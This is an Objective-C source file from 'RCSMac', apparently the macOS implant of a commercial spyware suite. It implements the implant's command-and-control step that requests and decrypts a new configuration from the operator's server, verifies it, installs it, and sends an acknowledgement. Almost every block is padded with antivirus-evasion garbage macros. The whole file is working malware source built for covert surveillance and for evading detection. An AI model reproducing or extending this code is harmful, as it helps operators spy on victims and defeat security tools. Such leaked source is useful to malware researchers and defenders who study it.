/*
 * RCSMac - ConfigurationUpdate Network Operation
 *
 *
 * Created by revenge on 12/01/2011
 * Copyright (C) HT srl 2011. All rights reserved
 *
 */
#import "RCSMCommon.h"

#import "ConfNetworkOperation.h"
#import "NSString+SHA1.h"
#import "NSData+SHA1.h"
#import "NSMutableData+AES128.h"
#import "NSMutableData+SHA1.h"
#import "RCSMInfoManager.h"

#import "RCSMTaskManager.h"
#import "RCSMLogger.h"
#import "RCSMDebug.h"

#import "RCSMAVGarbage.h"

@implementation ConfNetworkOperation

- (id)initWithTransport: (RESTTransport *)aTransport
{
  if (self = [super init])
    {
      mTransport = aTransport;
      
      // AV evasion: only on release build
      AV_GARBAGE_003
      
      return self;
    }
  
  return nil;
}

// Done.
- (BOOL)perform
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  uint32_t command = PROTO_NEW_CONF;
  NSMutableData *commandData = [[NSMutableData alloc] initWithBytes: &command
                                                             length: sizeof(uint32_t)];
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  NSData *commandSha = [commandData sha1Hash];
  [commandData appendData: commandSha];
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  [commandData encryptWithKey: gSessionKey];
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  //
  // Send encrypted message
  //
  NSURLResponse *urlResponse    = nil;
  NSData *replyData             = nil;
  NSMutableData *replyDecrypted = nil;
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  replyData = [mTransport sendData: commandData
                 returningResponse: urlResponse];
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  __m_MInfoManager *infoManager = [[__m_MInfoManager alloc] init];
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  if (replyData == nil)
    {
      [infoManager release];
      [commandData release];
      [outerPool release];
      return NO;
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_005
  
  replyDecrypted = [[NSMutableData alloc] initWithData: replyData];
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  [replyDecrypted decryptWithKey: gSessionKey];
  
  // AV evasion: only on release build
  AV_GARBAGE_006
  
  [replyDecrypted getBytes: &command
                    length: sizeof(uint32_t)];
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  // remove padding
  [replyDecrypted removePadding];
  
  // AV evasion: only on release build
  AV_GARBAGE_008
  
  //
  // check integrity
  //
  NSData *shaRemote;
  NSData *shaLocal;
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  @try
    {
      
      // AV evasion: only on release build
      AV_GARBAGE_008
      
      shaRemote = [replyDecrypted subdataWithRange:
                   NSMakeRange([replyDecrypted length] - CC_SHA1_DIGEST_LENGTH,
                               CC_SHA1_DIGEST_LENGTH)];
  
      
      // AV evasion: only on release build
      AV_GARBAGE_006
      
      shaLocal = [replyDecrypted subdataWithRange:
                  NSMakeRange(0, [replyDecrypted length] - CC_SHA1_DIGEST_LENGTH)];
    }
  @catch (NSException *e)
    { 
      // AV evasion: only on release build
      AV_GARBAGE_000
    
      // FIXED-
      [replyDecrypted release];
      [infoManager release];
      [commandData release];
      [outerPool release];
      return NO;
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  shaLocal = [shaLocal sha1Hash];
  
  // AV evasion: only on release build
  AV_GARBAGE_005
  
  if ([shaRemote isEqualToData: shaLocal] == NO)
    { 
      // AV evasion: only on release build
      AV_GARBAGE_006
    
      [infoManager release];
      [replyDecrypted release];
      [commandData release];
      [outerPool release];
      
      // AV evasion: only on release build
      AV_GARBAGE_007
      
      return NO;
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  if (command != PROTO_OK)
    {   
      [infoManager release];
      [replyDecrypted release];
      [commandData release];
      [outerPool release];
      return NO;
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  uint32_t configSize = 0;
  @try
    {
      
      // AV evasion: only on release build
      AV_GARBAGE_002
      
      [replyDecrypted getBytes: &configSize
                         range: NSMakeRange(4, sizeof(uint32_t))];
    }
  @catch (NSException *e)
    {
      
      // AV evasion: only on release build
      AV_GARBAGE_007
  
      [infoManager logActionWithDescription: @"Corrupted configuration received"];
      
      // AV evasion: only on release build
      AV_GARBAGE_001
      
      [infoManager release];
      [replyDecrypted release];
      [commandData release];
      [outerPool release];      
      return NO;
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_008
  
  if (configSize == 0)
    {   
      [infoManager logActionWithDescription: @"Corrupted configuration received"];
      
      // AV evasion: only on release build
      AV_GARBAGE_003
      
      [infoManager release];
      [replyDecrypted release];
      [commandData release];
      [outerPool release];
      
      // AV evasion: only on release build
      AV_GARBAGE_000
      
      return NO;
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_009
  
  NSMutableData *configData;
  
  @try
    {
      
      // AV evasion: only on release build
      AV_GARBAGE_005
      
      configData = [[NSMutableData alloc] initWithData:
                    [replyDecrypted subdataWithRange: NSMakeRange(8, configSize)]];
    }
  @catch (NSException *e)
    {      
      
      // AV evasion: only on release build
      AV_GARBAGE_001
      
      [infoManager logActionWithDescription: @"Corrupted configuration received"];
      
      // AV evasion: only on release build
      AV_GARBAGE_004
      
      [infoManager release];
      [replyDecrypted release];
      [commandData release];
      [outerPool release];
      
      // AV evasion: only on release build
      AV_GARBAGE_003
      
      return NO;
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_005
  
  //
  // Store new configuration file
  //
  __m_MTaskManager *taskManager = [__m_MTaskManager sharedInstance];
  
  // AV evasion: only on release build
  AV_GARBAGE_008
  
  // Done.
  if ([taskManager updateConfiguration: configData] == FALSE)
    {  
      // FIXED-
      [configData release];
      [infoManager release];
      [replyDecrypted release];
      [commandData release];
      [outerPool release];
      return NO;
    }
  //
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  [infoManager release];
  [configData release];
  [replyDecrypted release];
  [commandData release];
  [outerPool release];
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  return YES;
}

- (BOOL)sendConfAck:(int)retAck
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  // AV evasion: only on release build
  AV_GARBAGE_008
  
  uint32_t command = PROTO_NEW_CONF;
  NSMutableData *commandData = [[NSMutableData alloc] initWithBytes: &command
                                                             length: sizeof(uint32_t)];
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  [commandData appendBytes: &retAck length:sizeof(int)];                                                          
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  NSData *commandSha = [commandData sha1Hash];
  [commandData appendData: commandSha];
  
  // AV evasion: only on release build
  AV_GARBAGE_006
  
  [commandData encryptWithKey: gSessionKey];
  
  // AV evasion: only on release build
  AV_GARBAGE_005
  
  //
  // Send encrypted message
  //
  NSURLResponse *urlResponse    = nil;
  NSData *replyData             = nil;
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  replyData = [mTransport sendData: commandData
                 returningResponse: urlResponse];
  
  if (replyData == nil)
    {
      
      // AV evasion: only on release build
      AV_GARBAGE_003
      
      [commandData release];
      [outerPool release];
      return NO;
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  [commandData release];
  [outerPool release];
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  return YES;
}

@end
